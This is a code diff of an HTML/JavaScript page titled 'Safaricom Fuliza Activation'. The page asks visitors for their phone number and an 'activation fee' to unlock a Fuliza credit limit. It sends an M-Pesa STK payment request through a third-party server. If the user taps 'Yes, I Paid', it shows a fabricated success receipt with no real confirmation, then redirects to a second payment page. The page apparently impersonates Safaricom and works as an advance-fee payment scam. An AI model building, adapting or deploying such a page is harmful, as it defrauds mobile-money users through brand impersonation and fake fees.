@@ -1,11 +1,14 @@
-<!DOCTYPE html>  <html lang="en">  
-<head>  
-<meta charset="UTF-8">  
-<meta name="viewport" content="width=device-width, initial-scale=1.0">  
-<title>Activate Your Fuliza Limit</title>  
-<style>  
-*{box-sizing:border-box;margin:0;padding:0;}  
-body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;}  .top-bar{background:linear-gradient(135deg,#1fb141,#16903a);padding:14px;text-align:center;color:#fff;font-weight:700;font-size:18px;letter-spacing:.3px;box-shadow:0 2px 8px rgba(0,0,0,.15);}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Activate Your Fuliza Limit</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;}
+
+.top-bar{background:linear-gradient(135deg,#1fb141,#16903a);padding:14px;text-align:center;color:#fff;font-weight:700;font-size:18px;letter-spacing:.3px;box-shadow:0 2px 8px rgba(0,0,0,.15);}
 
 .payment-box{max-width:430px;margin:50px auto 30px;background:#fff;padding:32px 28px;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);text-align:center;}
 .payment-box h2{color:#1a1a2e;font-size:20px;margin-bottom:10px;}
@@ -84,353 +87,380 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 .confirm-sms-note{margin:14px 24px 0;background:#fffbf0;border-left:4px solid #f39c12;border-radius:4px;padding:10px 14px;font-size:13px;color:#7d5a00;line-height:1.5;text-align:left;}
 
 @media(max-width:480px){
-.payment-box{margin:20px 12px;padding:24px 18px;}
-.popup{border-radius:18px 18px 0 0;}
+  .payment-box{margin:20px 12px;padding:24px 18px;}
+  .popup{border-radius:18px 18px 0 0;}
 }
 </style>
+</head>
+<body>
 
-</head>  
-<body>  <header class="top-bar">Safaricom Fuliza Activation</header>  <div class="payment-box">  
-  <h2>Activate Your Fuliza Limit Now</h2>    <p class="encourage">  
-    Pay your activation fee today to unlock your desired Fuliza limit instantly. Ensure uninterrupted transactions and enjoy seamless access to your funds.  
-  </p>    <div class="info-row">Selected Limit: <strong id="limit">—</strong></div>  
-  <div class="info-row">Activation Fee: <strong id="fee">—</strong></div>    <div style="margin-top:18px;text-align:left;">  
-    <label style="font-size:14px;font-weight:600;color:#444;">Safaricom Phone Number</label>  
-    <div class="phone-wrap" id="phoneWrap">  
-      <span class="phone-prefix">254</span>  
-      <input class="phone-input" type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="9" inputmode="numeric" autocomplete="tel">  
-      <span class="phone-status" id="phoneStatus"></span>  
-    </div>  
-    <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>  
-  </div>  <button class="pay-btn" id="payBtn" onclick="payNow()">Pay Activation Fee Now</button>
+<header class="top-bar">Safaricom Fuliza Activation</header>
 
-  <div class="spinner" id="spinner">  
-    <div class="loader"></div>  
-    <div class="spinner-text" id="spinnerText">Sending STK Push to your phone…</div>  
-  </div>    <div class="status-msg" id="statusMsg"></div>    <p class="encourage" style="margin-top:22px;">  
-    Make sure to complete the payment to enjoy your increased Fuliza limit immediately. This small investment secures your ability to transact freely without delays.  
-  </p>  
-</div>  <!-- Success Popup -->  <div class="overlay" id="successOverlay">  
-  <div class="popup">  
-    <div class="popup-header success">  
-      <div class="popup-icon">✅</div>  
-      <div class="popup-title">Payment Successful!</div>  
-      <div class="popup-subtitle">Your Fuliza activation is confirmed</div>  
-    </div>  
-    <div class="receipt-body" id="receiptBody">  
-      <div class="receipt-row"><span class="receipt-label">Receipt No.</span><span class="receipt-value" id="rReceiptNo">—</span></div>  
-      <div class="receipt-row"><span class="receipt-label">Amount Paid</span><span class="receipt-value" id="rAmount">—</span></div>  
-      <div class="receipt-row"><span class="receipt-label">Phone</span><span class="receipt-value" id="rPhone">—</span></div>  
-      <div class="receipt-row"><span class="receipt-label">Date &amp; Time</span><span class="receipt-value" id="rDate">—</span></div>  
-      <div class="receipt-row"><span class="receipt-label">Status</span><span class="receipt-value" style="color:#1fb141;">Completed ✓</span></div>  
-    </div>  
-    <div class="purpose-note" id="rPurpose">Payment for: Fuliza Limit Activation</div>  
-    <div class="countdown-wrap">  
-      <div class="countdown-text">Redirecting to next step in <span id="countdownNum">10</span>s</div>  
-      <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill" style="width:100%;"></div></div>  
-    </div>  
-    <div class="popup-actions">  
-      <button class="btn-proceed" onclick="goNext()">Proceed Now →</button>  
-    </div>  
-  </div>  
-</div>  <!-- Self-confirm Popup -->  <div class="overlay" id="confirmOverlay">  
-  <div class="popup">  
-    <div class="popup-header confirm">  
-      <div class="popup-icon">❓</div>  
-      <div class="popup-title">Did you receive an M-Pesa SMS?</div>  
-      <div class="popup-subtitle">We haven't received automatic confirmation yet</div>  
-    </div>  
-    <div class="confirm-body">  
-      <p>If Safaricom sent you a confirmation message saying your payment was successful, tap <strong>Yes, I Paid</strong> to continue.</p>  
-    </div>  
-    <div class="confirm-sms-note">  
-      📩 Check your M-Pesa messages. If you see a confirmation SMS with an amount deducted, your payment went through successfully.  
-    </div>  
-    <div class="popup-actions">  
-      <button class="btn-proceed" onclick="manualConfirm()">Yes, I Paid ✓</button>  
-      <button class="btn-retry" onclick="manualFail()">No, Retry</button>  
-    </div>  
-  </div>  
-</div>  <!-- Failure Popup -->  <div class="overlay" id="failureOverlay">  
-  <div class="popup">  
-    <div class="popup-header failure">  
-      <div class="popup-icon">❌</div>  
-      <div class="popup-title">Payment Failed</div>  
-      <div class="popup-subtitle" id="failureSubtitle">Your payment could not be completed</div>  
-    </div>  
-    <div class="purpose-note failure-note" id="failureReason">Please check your M-Pesa PIN and M-Pesa balance, then try again.</div>  
-    <div class="popup-actions">  
-      <button class="btn-retry" onclick="retryPayment()">↩ Try Again</button>  
-      <button class="btn-close" onclick="closeFailure()">Close</button>  
-    </div>  
-  </div>  
-</div>  <script>  
-const BACKEND = "https://mpayafrica-server.onrender.com";  
-  
-const selectedAmount = localStorage.getItem("selectedAmount") || "—";  
-const activationFee  = localStorage.getItem("activationFee")  || "—";  
-document.getElementById("limit").innerText = "KSh " + selectedAmount;  
-document.getElementById("fee").innerText   = "KSh " + activationFee;  
-  
-const phoneInput  = document.getElementById("phone");  
-const phoneWrap   = document.getElementById("phoneWrap");  
-const phoneStatus = document.getElementById("phoneStatus");  
-const phoneHint   = document.getElementById("phoneHint");  
-  
-phoneInput.addEventListener("input", () => {  
-  phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 9);  
-  validatePhoneUI(phoneInput.value);  
-});  
-  
-function validatePhoneUI(val) {  
-  if (val.length === 0) {  
-    phoneWrap.className = "phone-wrap";  
-    phoneStatus.innerText = "";  
-    phoneHint.style.color = "#888";  
-    phoneHint.innerText = "Enter 9 digits after 254 — must start with 7 or 1 (e.g. 712345678 or 112345678)";  
-    return false;  
-  }  
-  if (val.length < 9) {  
-    phoneWrap.className = "phone-wrap";  
-    phoneStatus.innerText = "";  
-    phoneHint.style.color = "#888";  
-    phoneHint.innerText = `${9 - val.length} more digit${9 - val.length !== 1 ? "s" : ""} needed`;  
-    return false;  
-  }  
-  if (!val.startsWith("7")&&!val.startsWith("1")) {  
-    phoneWrap.className = "phone-wrap invalid";  
-    phoneStatus.innerText = "✗";  
-    phoneStatus.style.color = "#e74c3c";  
-    phoneHint.style.color = "#e74c3c";  
-    phoneHint.innerText = "Must start with 7 or 1— Safaricom only (e.g. 7XXXXXXXX or 1XXXXXXXX)";  
-    return false;  
-  }  
-  phoneWrap.className = "phone-wrap valid";  
-  phoneStatus.innerText = "✓";  
-  phoneStatus.style.color = "#1fb141";  
-  phoneHint.style.color = "#1fb141";  
-  phoneHint.innerText = "Valid Safaricom number ✓";  
-  return true;  
-}  
-  
-function showStatus(msg, type) {  
-  const el = document.getElementById("statusMsg");  
-  el.innerText = msg;  
-  el.className = "status-msg " + type;  
-  el.style.display = "block";  
-}  
-  
-function hideStatus() {  
-  document.getElementById("statusMsg").style.display = "none";  
-}  
-  
-function setSpinner(show, text) {  
-  const s = document.getElementById("spinner");  
-  s.style.display = show ? "flex" : "none";  
-  if (text) document.getElementById("spinnerText").innerText = text;  
-}  
-  
-function setPayBtn(disabled) {  
-  document.getElementById("payBtn").disabled = disabled;  
-}  
-  
-let pollInterval = null;  
-let redirectTimer = null;  
-let currentPhone = null;  
-let currentAmount = null;  
-  
-async function payNow() {  
-  const digits = phoneInput.value.trim();  
-  if (!validatePhoneUI(digits)) {  
-    showStatus("Please enter a valid Safaricom number (starts with 7 or 1, 9 digits after 254).", "error");  
-    return;  
-  }  
-  
-  const fullPhone = "254" + digits;  
-  const amount = Number(activationFee) || 0;  
-  if (!amount || amount <= 0) {  
-    showStatus("No activation fee found. Please go back and select your limit.", "error");  
-    return;  
-  }  
-  
-  currentPhone = fullPhone;  
-  currentAmount = amount;  
-  
-  hideStatus();  
-  setSpinner(true, "Sending STK Push to your phone…");  
-  setPayBtn(true);  
-  
-  let data;  
-  try {  
-    const res = await fetch(BACKEND + "/api/stk-push", {  
-      method: "POST",  
-      headers: { "Content-Type": "application/json" },  
-      body: JSON.stringify({  
-        amount,  
-        phone_number: fullPhone,  
-        user_reference: "Fuliza Limit Activation",  
-        payment_id: "wallet",  
-      }),  
-    });  
-    data = await res.json();  
-  } catch (err) {  
-    setSpinner(false);  
-    setPayBtn(false);  
-    showStatus("Network error: Could not reach server. Check your connection and try again.", "error");  
-    return;  
-  }  
-  
-  if (!data.success) {  
-    setSpinner(false);  
-    setPayBtn(false);  
-    showStatus((data.message || data.error || "Payment initiation failed. Please try again."), "error");  
-    return;  
-  }  
-  
-  const checkoutId = data.checkoutRequestId;  
-  setSpinner(true, "STK Push sent ✅ Enter your M-Pesa PIN on your phone…");  
-  showStatus("Check your phone and enter your M-Pesa PIN to complete payment.", "info");  
-  
-  if (!checkoutId) {  
-    setSpinner(false);  
-    setPayBtn(false);  
-    showStatus("Payment sent but could not track status. Check your M-Pesa messages.", "info");  
-    return;  
-  }  
-  
-  startPolling(checkoutId, fullPhone);  
-}  
-  
-function startPolling(checkoutId, phone) {  
-  let attempts = 0;  
-  const maxAttempts = 40;  
-  const confirmAttempt = 10; // show self-confirm after 30s  
-  
-  clearInterval(pollInterval);  
-  pollInterval = setInterval(async () => {  
-    attempts++;  
-  
-    if (attempts === confirmAttempt) {  
-      setSpinner(true, "Still waiting for confirmation…");  
-    }  
-  
-    if (attempts > maxAttempts) {  
-      clearInterval(pollInterval);  
-      setSpinner(false);  
-      setPayBtn(false);  
-      hideStatus();  
-      showSelfConfirm();  
-      return;  
-    }  
-  
-    try {  
-      const res = await fetch(`${BACKEND}/receipt/${encodeURIComponent(checkoutId)}`);  
-      const data = await res.json();  
-  
-      if (data.status === "pending" || data.status === "not_found") return;  
-  
-      clearInterval(pollInterval);  
-      setSpinner(false);  
-      setPayBtn(false);  
-      hideStatus();  
-  
-      if (data.status === "success" && data.receipt) {  
-        showSuccessPopup(data.receipt, phone);  
-      } else if (data.status === "failed") {  
-        showFailurePopup(data.reason || "Payment was not completed. Please try again.");  
-      }  
-    } catch (_) {}  
-  }, 3000);  
-  
-  // Show self-confirm prompt after 30 seconds regardless  
-  setTimeout(() => {  
-    if (pollInterval !== null) {  
-      clearInterval(pollInterval);  
-      pollInterval = null;  
-      setSpinner(false);  
-      hideStatus();  
-      showSelfConfirm();  
-    }  
-  }, 32000);  
-}  
-  
-function showSelfConfirm() {  
-  document.getElementById("confirmOverlay").classList.add("show");  
-}  
-  
-function manualConfirm() {  
-  document.getElementById("confirmOverlay").classList.remove("show");  
-  showSuccessPopup({  
-    receiptNumber: "Check M-Pesa SMS",  
-    amount: currentAmount,  
-    phone: currentPhone,  
-    transactionDate: new Date().toLocaleString("en-KE"),  
-    purpose: "Fuliza Limit Activation",  
-  }, currentPhone);  
-}  
-  
-function manualFail() {  
-  document.getElementById("confirmOverlay").classList.remove("show");  
-  showFailurePopup("Payment was not completed. Please try again.");  
-}  
-  
-function showSuccessPopup(receipt, fallbackPhone) {  
-  document.getElementById("rReceiptNo").innerText = receipt.receiptNumber || "N/A";  
-  document.getElementById("rAmount").innerText    = "KSh " + (receipt.amount || activationFee);  
-  document.getElementById("rPhone").innerText     = receipt.phone || fallbackPhone || "—";  
-  document.getElementById("rDate").innerText      = receipt.transactionDate || new Date().toLocaleString("en-KE");  
-  document.getElementById("rPurpose").innerText   = "Payment for: " + (receipt.purpose || "Fuliza Limit Activation");  
-  
-  const overlay = document.getElementById("successOverlay");  
-  overlay.classList.add("show");  
-  
-  startCountdown(10);  
-}  
-  
-function startCountdown(seconds) {  
-  clearTimeout(redirectTimer);  
-  const total = seconds;  
-  let remaining = seconds;  
-  
-  document.getElementById("countdownNum").innerText = remaining;  
-  document.getElementById("progressFill").style.width = "100%";  
-  
-  const tick = () => {  
-    remaining--;  
-    document.getElementById("countdownNum").innerText = remaining;  
-    const pct = (remaining / total) * 100;  
-    document.getElementById("progressFill").style.width = pct + "%";  
-  
-    if (remaining <= 0) {  
-      goNext();  
-      return;  
-    }  
-    redirectTimer = setTimeout(tick, 1000);  
-  };  
-  
-  redirectTimer = setTimeout(tick, 1000);  
-}  
-  
-function goNext() {  
-  clearTimeout(redirectTimer);  
-  window.location.href = "payment2.html";  
-}  
-  
-function showFailurePopup(reason) {  
-  document.getElementById("failureReason").innerText = reason || "Payment failed. Please try again.";  
-  document.getElementById("failureOverlay").classList.add("show");  
-}  
-  
-function retryPayment() {  
-  document.getElementById("failureOverlay").classList.remove("show");  
-  setPayBtn(false);  
-  hideStatus();  
-  clearInterval(pollInterval);  
-  clearTimeout(redirectTimer);  
-}  
-  
-function closeFailure() {  
-  document.getElementById("failureOverlay").classList.remove("show");  
-}  
-</script>  </body>  
-</html>  
+<div class="payment-box">
+  <h2>Activate Your Fuliza Limit Now</h2>
+
+  <p class="encourage">
+    Pay your activation fee today to unlock your desired Fuliza limit instantly. Ensure uninterrupted transactions and enjoy seamless access to your funds.
+  </p>
+
+  <div class="info-row">Selected Limit: <strong id="limit">—</strong></div>
+  <div class="info-row">Activation Fee: <strong id="fee">—</strong></div>
+
+  <div style="margin-top:18px;text-align:left;">
+    <label style="font-size:14px;font-weight:600;color:#444;">Safaricom Phone Number</label>
+    <div class="phone-wrap" id="phoneWrap">
+      <span class="phone-prefix">254</span>
+      <input class="phone-input" type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="9" inputmode="numeric" autocomplete="tel">
+      <span class="phone-status" id="phoneStatus"></span>
+    </div>
+    <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
+  </div>
+
+  <button class="pay-btn" id="payBtn" onclick="payNow()">Pay Activation Fee Now</button>
+
+  <div class="spinner" id="spinner">
+    <div class="loader"></div>
+    <div class="spinner-text" id="spinnerText">Sending STK Push to your phone…</div>
+  </div>
+
+  <div class="status-msg" id="statusMsg"></div>
+
+  <p class="encourage" style="margin-top:22px;">
+    Make sure to complete the payment to enjoy your increased Fuliza limit immediately. This small investment secures your ability to transact freely without delays.
+  </p>
+</div>
+
+<!-- Success Popup -->
+<div class="overlay" id="successOverlay">
+  <div class="popup">
+    <div class="popup-header success">
+      <div class="popup-icon">✅</div>
+      <div class="popup-title">Payment Successful!</div>
+      <div class="popup-subtitle">Your Fuliza activation is confirmed</div>
+    </div>
+    <div class="receipt-body" id="receiptBody">
+      <div class="receipt-row"><span class="receipt-label">Receipt No.</span><span class="receipt-value" id="rReceiptNo">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Amount Paid</span><span class="receipt-value" id="rAmount">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Phone</span><span class="receipt-value" id="rPhone">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Date &amp; Time</span><span class="receipt-value" id="rDate">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Status</span><span class="receipt-value" style="color:#1fb141;">Completed ✓</span></div>
+    </div>
+    <div class="purpose-note" id="rPurpose">Payment for: Fuliza Limit Activation</div>
+    <div class="countdown-wrap">
+      <div class="countdown-text">Redirecting to next step in <span id="countdownNum">10</span>s</div>
+      <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill" style="width:100%;"></div></div>
+    </div>
+    <div class="popup-actions">
+      <button class="btn-proceed" onclick="goNext()">Proceed Now →</button>
+    </div>
+  </div>
+</div>
+
+<!-- Self-confirm Popup -->
+<div class="overlay" id="confirmOverlay">
+  <div class="popup">
+    <div class="popup-header confirm">
+      <div class="popup-icon">❓</div>
+      <div class="popup-title">Did you receive an M-Pesa SMS?</div>
+      <div class="popup-subtitle">We haven't received automatic confirmation yet</div>
+    </div>
+    <div class="confirm-body">
+      <p>If Safaricom sent you a confirmation message saying your payment was successful, tap <strong>Yes, I Paid</strong> to continue.</p>
+    </div>
+    <div class="confirm-sms-note">
+      📩 Check your M-Pesa messages. If you see a confirmation SMS with an amount deducted, your payment went through successfully.
+    </div>
+    <div class="popup-actions">
+      <button class="btn-proceed" onclick="manualConfirm()">Yes, I Paid ✓</button>
+      <button class="btn-retry" onclick="manualFail()">No, Retry</button>
+    </div>
+  </div>
+</div>
+
+<!-- Failure Popup -->
+<div class="overlay" id="failureOverlay">
+  <div class="popup">
+    <div class="popup-header failure">
+      <div class="popup-icon">❌</div>
+      <div class="popup-title">Payment Failed</div>
+      <div class="popup-subtitle" id="failureSubtitle">Your payment could not be completed</div>
+    </div>
+    <div class="purpose-note failure-note" id="failureReason">Please check your M-Pesa PIN and M-Pesa balance, then try again.</div>
+    <div class="popup-actions">
+      <button class="btn-retry" onclick="retryPayment()">↩ Try Again</button>
+      <button class="btn-close" onclick="closeFailure()">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const BACKEND = "https://mpayafrica-server.onrender.com";
+
+const selectedAmount = localStorage.getItem("selectedAmount") || "—";
+const activationFee  = localStorage.getItem("activationFee")  || "—";
+document.getElementById("limit").innerText = "KSh " + selectedAmount;
+document.getElementById("fee").innerText   = "KSh " + activationFee;
+
+const phoneInput  = document.getElementById("phone");
+const phoneWrap   = document.getElementById("phoneWrap");
+const phoneStatus = document.getElementById("phoneStatus");
+const phoneHint   = document.getElementById("phoneHint");
+
+phoneInput.addEventListener("input", () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 9);
+  validatePhoneUI(phoneInput.value);
+});
+
+function validatePhoneUI(val) {
+  if (val.length === 0) {
+    phoneWrap.className = "phone-wrap";
+    phoneStatus.innerText = "";
+    phoneHint.style.color = "#888";
+    phoneHint.innerText = "Enter 9 digits after 254 — starts with 7 (07xx) or 1 (01xx)";
+    return false;
+  }
+  if (val.length < 9) {
+    phoneWrap.className = "phone-wrap";
+    phoneStatus.innerText = "";
+    phoneHint.style.color = "#888";
+    phoneHint.innerText = `${9 - val.length} more digit${9 - val.length !== 1 ? "s" : ""} needed`;
+    return false;
+  }
+  if (!val.startsWith("7") && !val.startsWith("1")) {
+    phoneWrap.className = "phone-wrap invalid";
+    phoneStatus.innerText = "✗";
+    phoneStatus.style.color = "#e74c3c";
+    phoneHint.style.color = "#e74c3c";
+    phoneHint.innerText = "Must start with 7 or 1 — Safaricom numbers only (07xx / 01xx)";
+    return false;
+  }
+  phoneWrap.className = "phone-wrap valid";
+  phoneStatus.innerText = "✓";
+  phoneStatus.style.color = "#1fb141";
+  phoneHint.style.color = "#1fb141";
+  phoneHint.innerText = "Valid Safaricom number ✓";
+  return true;
+}
+
+function showStatus(msg, type) {
+  const el = document.getElementById("statusMsg");
+  el.innerText = msg;
+  el.className = "status-msg " + type;
+  el.style.display = "block";
+}
+
+function hideStatus() {
+  document.getElementById("statusMsg").style.display = "none";
+}
+
+function setSpinner(show, text) {
+  const s = document.getElementById("spinner");
+  s.style.display = show ? "flex" : "none";
+  if (text) document.getElementById("spinnerText").innerText = text;
+}
+
+function setPayBtn(disabled) {
+  document.getElementById("payBtn").disabled = disabled;
+}
+
+let pollInterval = null;
+let redirectTimer = null;
+let currentPhone = null;
+let currentAmount = null;
+
+async function payNow() {
+  const digits = phoneInput.value.trim();
+  if (!validatePhoneUI(digits)) {
+    showStatus("Please enter a valid Safaricom number (starts with 7 or 1, 9 digits after 254).", "error");
+    return;
+  }
+
+  const fullPhone = "254" + digits;
+  const amount = Number(activationFee) || 0;
+  if (!amount || amount <= 0) {
+    showStatus("No activation fee found. Please go back and select your limit.", "error");
+    return;
+  }
+
+  currentPhone = fullPhone;
+  currentAmount = amount;
+
+  hideStatus();
+  setSpinner(true, "Sending STK Push to your phone…");
+  setPayBtn(true);
+
+  let data;
+  try {
+    const res = await fetch(BACKEND + "/api/stk-push", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        amount,
+        phone_number: fullPhone,
+        user_reference: "Fuliza Limit Activation",
+        payment_id: "wallet",
+      }),
+    });
+    data = await res.json();
+  } catch (err) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Network error: Could not reach server. Check your connection and try again.", "error");
+    return;
+  }
+
+  if (!data.success) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus((data.message || data.error || "Payment initiation failed. Please try again."), "error");
+    return;
+  }
+
+  const checkoutId = data.checkoutRequestId;
+  setSpinner(true, "STK Push sent ✅ Enter your M-Pesa PIN on your phone…");
+  showStatus("Check your phone and enter your M-Pesa PIN to complete payment.", "info");
+
+  if (!checkoutId) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Payment sent but could not track status. Check your M-Pesa messages.", "info");
+    return;
+  }
+
+  startPolling(checkoutId, fullPhone);
+}
+
+function startPolling(checkoutId, phone) {
+  let attempts = 0;
+  const maxAttempts = 40;
+  const confirmAttempt = 10; // show self-confirm after 30s
+
+  clearInterval(pollInterval);
+  pollInterval = setInterval(async () => {
+    attempts++;
+
+    if (attempts === confirmAttempt) {
+      setSpinner(true, "Still waiting for confirmation…");
+    }
+
+    if (attempts > maxAttempts) {
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      hideStatus();
+      showSelfConfirm();
+      return;
+    }
+
+    try {
+      const res = await fetch(`${BACKEND}/receipt/${encodeURIComponent(checkoutId)}`);
+      const data = await res.json();
+
+      if (data.status === "pending" || data.status === "not_found") return;
+
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      hideStatus();
+
+      if (data.status === "success" && data.receipt) {
+        showSuccessPopup(data.receipt, phone);
+      } else if (data.status === "failed") {
+        showFailurePopup(data.reason || "Payment was not completed. Please try again.");
+      }
+    } catch (_) {}
+  }, 3000);
+
+  // Show self-confirm prompt after 30 seconds regardless
+  setTimeout(() => {
+    if (pollInterval !== null) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+      setSpinner(false);
+      hideStatus();
+      showSelfConfirm();
+    }
+  }, 32000);
+}
+
+function showSelfConfirm() {
+  document.getElementById("confirmOverlay").classList.add("show");
+}
+
+function manualConfirm() {
+  document.getElementById("confirmOverlay").classList.remove("show");
+  showSuccessPopup({
+    receiptNumber: "Check M-Pesa SMS",
+    amount: currentAmount,
+    phone: currentPhone,
+    transactionDate: new Date().toLocaleString("en-KE"),
+    purpose: "Fuliza Limit Activation",
+  }, currentPhone);
+}
+
+function manualFail() {
+  document.getElementById("confirmOverlay").classList.remove("show");
+  showFailurePopup("Payment was not completed. Please try again.");
+}
+
+function showSuccessPopup(receipt, fallbackPhone) {
+  document.getElementById("rReceiptNo").innerText = receipt.receiptNumber || "N/A";
+  document.getElementById("rAmount").innerText    = "KSh " + (receipt.amount || activationFee);
+  document.getElementById("rPhone").innerText     = receipt.phone || fallbackPhone || "—";
+  document.getElementById("rDate").innerText      = receipt.transactionDate || new Date().toLocaleString("en-KE");
+  document.getElementById("rPurpose").innerText   = "Payment for: " + (receipt.purpose || "Fuliza Limit Activation");
+
+  const overlay = document.getElementById("successOverlay");
+  overlay.classList.add("show");
+
+  startCountdown(10);
+}
+
+function startCountdown(seconds) {
+  clearTimeout(redirectTimer);
+  const total = seconds;
+  let remaining = seconds;
+
+  document.getElementById("countdownNum").innerText = remaining;
+  document.getElementById("progressFill").style.width = "100%";
+
+  const tick = () => {
+    remaining--;
+    document.getElementById("countdownNum").innerText = remaining;
+    const pct = (remaining / total) * 100;
+    document.getElementById("progressFill").style.width = pct + "%";
+
+    if (remaining <= 0) {
+      goNext();
+      return;
+    }
+    redirectTimer = setTimeout(tick, 1000);
+  };
+
+  redirectTimer = setTimeout(tick, 1000);
+}
+
+function goNext() {
+  clearTimeout(redirectTimer);
+  window.location.href = "payment2.html";
+}
+
+function showFailurePopup(reason) {
+  document.getElementById("failureReason").innerText = reason || "Payment failed. Please try again.";
+  document.getElementById("failureOverlay").classList.add("show");
+}
+
+function retryPayment() {
+  document.getElementById("failureOverlay").classList.remove("show");
+  setPayBtn(false);
+  hideStatus();
+  clearInterval(pollInterval);
+  clearTimeout(redirectTimer);
+}
+
+function closeFailure() {
+  document.getElementById("failureOverlay").classList.remove("show");
+}
+</script>
+</body>
+</html>
